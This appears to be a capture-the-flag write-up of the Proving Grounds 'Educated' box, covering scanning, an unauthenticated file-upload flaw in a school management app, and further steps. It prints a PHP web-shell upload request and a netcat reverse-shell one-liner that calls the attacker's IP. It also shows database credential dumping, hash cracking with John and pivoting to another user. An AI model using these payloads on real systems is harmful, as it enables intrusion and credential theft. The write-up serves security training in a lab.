---
layout: default
title: Educated
parent: Proving Grounds Practice - Linux
nav_order: 16
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/educated]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.173.13

Nmap scan report for 192.168.173.13
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Wisdom Elementary School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

---

After considerable enumeration, the writeup indicates source code for the real site source code needs to be consulted for the following:

1. Determining that the site is using "Free School Management Software 1.0"
2. Reading the source code to see the "exanQustion" function does not do any authorization/authentication checks.

The exploit located at https://www.exploit-db.com/exploits/50587 lists the following steps to exploit:

```
Steps to exploit:
1) Navigate to http://localhost/admin/manage_profile
2) click "ADD NEW QUESTION PAPER" edit base infomation
3) uploading a php webshell containing "<?php system($_GET["cmd"]); ?>" in
the Field  "upload Drag and drop a file here or click"
3) Click "save"
4) open  http://localhost/uploads/exam_question/cmd.php?cmd=phpinfo() then
php code execution
Proof of concept (Poc):
The following payload will allow you to run the javascript -
<?php system($_GET["cmd"]); ?>
```

Here are the screenshots of the source code that show the uploading of a new exam question does not check for authentication.

![source1](../../../assets/images/ctfs/proving_grounds/educated/source1.png)

![source2](../../../assets/images/ctfs/proving_grounds/educated/source2.png)

Here is the payload that successfully uploaded a PHP web shell by exploiting the exam_question exploit above.

```bash
POST /management/admin/examQuestion/create HTTP/1.1

Host: 192.168.173.13

Accept-Encoding: gzip, deflate

Content-Type: multipart/form-data; boundary=---------------------------183813756938980137172117669544

Content-Length: 1336

Connection: close

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1



-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="name"



test4

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="class_id"



2

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="subject_id"



5

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="timestamp"



2021-12-08

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="teacher_id"



1

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="file_type"



txt

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="status"



1

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="description"



123123

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="_wysihtml5_mode"



1

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="file_name"; filename="cmd.php"

Content-Type: application/octet-stream



<?php system($_GET["cmd"]); ?>

-----------------------------183813756938980137172117669544--

---
```

![burp](../../../assets/images/ctfs/proving_grounds/educated/burp.png)

# Exploitation

---

Now that we have our PHP web shell uploaded we can demonstrate command execution.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/educated]
└─$ curl http://192.168.173.13/management/uploads/exam_question/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Let's send a nc-mknod oneliner to get a reverse shell on a net cat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/educated]
└─$ curl http://192.168.173.13/management/uploads/exam_question/cmd.php?cmd=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

```

![shell](../../../assets/images/ctfs/proving_grounds/educated/shell.png)

# Post-Exploitation

---

## Enumerate database.php

```bash
www-data@school:/var/www/html$ find / -name "database.php" 2>/dev/null
find / -name "database.php" 2>/dev/null
/var/www/html/management/application/config/database.php

$db['default'] = array(
        'dsn' => '',
        'hostname' => 'localhost',
        'username' => 'school',
        'password' => '@jCma4s8ZM<?kA',
        'database' => 'school_mgment',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,

```

Enumerate the database

```bash
www-data@school:/var/www/html/management/application/config$ mysql -uschool -p

mysql> use school_mgment;
use school_mgment;

mysql> select * from teacher;
select * from teacher;
+------------+-----------------+------+----------------+------------+------+--------------+-------------+------------------------------------------------------------------------------------------+------------+--------------------------+----------+---------+------------+----------+---------------+----------------+-------------+------------------------------------------+---------------+----------------+-----------------+----------------+--------+-----------------+---------+--------------+
| teacher_id | name            | role | teacher_number | birthday   | sex  | religion     | blood_group | address                                                                                  | phone      | email                    | facebook | twitter | googleplus | linkedin | qualification | marital_status | file_name   | password                                 | department_id | designation_id | date_of_joining | joining_salary | status | date_of_leaving | bank_id | login_status |
+------------+-----------------+------+----------------+------------+------+--------------+-------------+------------------------------------------------------------------------------------------+------------+--------------------------+----------+---------+------------+----------+---------------+----------------+-------------+------------------------------------------+---------------+----------------+-----------------+----------------+--------+-----------------+---------+--------------+
|          1 | Testing Teacher | 1    | f82e5cc        | 2018-08-19 | male | Christianity | B+          | 546787, Kertz shopping complext, Silicon Valley, United State of America, New York city. | +912345667 | michael_sander@school.pg | facebook | twitter | googleplus | linkedin | PhD           | Married        | profile.png | 3db12170ff3e811db10a76eadd9e9986e3c1a5b7 |             2 |              4 | 2019-09-15      | 5000           |      1 | 2019-09-18      |       3 | 0            |
+------------+-----------------+------+----------------+------------+------+--------------+-------------+------------------------------------------------------------------------------------------+------------+--------------------------+----------+---------+------------+----------+---------------+----------------+-------------+------------------------------------------+---------------+----------------+-----------------+----------------+--------+-----------------+---------+--------------+
1 row in set (0.00 sec)


```

## Crack Hash with John

Identify the hash with "Name that hash"

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/educated]
└─$ nth --file hash.txt

Most Likely
SHA-1, HC: 100 JtR: raw-sha1 Summary: Used for checksums.See more
HMAC-SHA1 (key = $salt), HC: 160 JtR: hmac-sha1
Haval-128, JtR: haval-128-4
RIPEMD-128, JtR: ripemd-128

```

Crack the hash using John and format for "raw-sha1"

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/educated]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=raw-sha1

greatteacher123  (?)

Session completed.
```

# Pivot to Msander Account

```bash
www-data@school:/var/www/html/management/application/config$ su msander
su msander
Password: greatteacher123

msander@school:/var/www/html/management/application/config$ whoami
whoami
msander

```

## Enumerate the "grade-app.apk" file

Transfer _grade-app.apk_ to attack machine

```bash
msander@school:/home/emiller/development$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.45.217 - - [06/Dec/2023 04:05:57] "GET /grade-app.apk HTTP/1.1" 200 -

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/educated]
└─$ wget http://192.168.173.13:8000/grade-app.apk
--2023-12-05 23:05:57--  http://192.168.173.13:8000/grade-app.apk
Connecting to 192.168.173.13:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4755263 (4.5M) [application/vnd.android.package-archive]
Saving to: ‘grade-app.apk’

grade-app.apk             100%[=====================================>]   4.53M  3.26MB/s    in 1.4s

2023-12-05 23:05:58 (3.26 MB/s) - ‘grade-app.apk’ saved [4755263/4755263]



```

Install jadx-gui

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/educated]
└─$ jadx-gui
Command 'jadx-gui' not found, but can be installed with:
sudo apt install jadx

```

Analyze the .apk file

```bash
package com.msander.myapplication;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

/* loaded from: classes3.dex */
public class MainActivity extends AppCompatActivity {
    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    private boolean check(String u, String p) {
        return DBWrapper.isValidCredential(u, p);
    }

    public void btnDoLogin(View v) {
        Intent myIntent = new Intent(this, DashboardActivity.class);
        EditText tvUsername = (EditText) findViewById(R.id.tvUsername);
        EditText tvPassword = (EditText) findViewById(R.id.tvPassword);
        if (check(tvUsername.getText().toString(), tvPassword.getText().toString())) {
            finish();
            startActivity(myIntent);
            return;
        }
        Toast.makeText(getBaseContext(), "Invalid login!", 1).show();
    }
}
```

According to the writeup we can reverse engineer this application and get the user creds.

These lead to no password sudo permissions.
